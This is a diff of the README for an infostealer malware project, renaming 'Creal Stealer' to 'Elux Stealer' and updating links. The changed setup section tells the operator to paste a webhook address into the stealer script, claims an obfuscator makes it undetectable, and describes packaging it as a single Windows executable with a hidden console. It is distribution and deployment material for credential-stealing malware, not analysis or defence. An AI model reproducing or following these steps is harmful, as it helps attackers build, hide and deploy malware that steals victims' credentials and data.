@@ -1,7 +1,7 @@
-<h1 align="center"> Creal Stealer </h1> 
+<h1 align="center"> Elux Stealer </h1> 
 <p align= "center"> <kbd> <img  src="https://i.imgur.com/MjoICHp.png"width="420"> </kbd><br><br>
 <p align="center"><a href="https://t.me/CrealStealer" target="_blank">if you need help join telegram group</a></p>
-<p align="center"><a href="https://github.com/Ayhuuu/Creal-Stealer/blob/main/IfYouInfected.md" target="_blank">if you are infected</a></p>
+<p align="center"><a href="https://github.com/Ayhuuu/Crelux/blob/main/IfYouInfected.md" target="_blank">if you are infected</a></p>
 
 
 
@@ -47,7 +47,7 @@
  
                                                       ⬇️ Setup (Manual)
  
-- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
+- First paste and save your webhook address instead of `"WEBHOOK HERE"` in Elux.py
 
 - If you use obfuscator it will be undetectable.
 
@@ -61,7 +61,7 @@
 
 - Browse file Select `One file and Windows Based (hide the console)`
 
-<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png"></img>
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="40%" src="https://raw.githubusercontent.com/Ayhuuu/Crelux/main/img/pyy.png"></img>
 
 - And press covert .py .exe
 
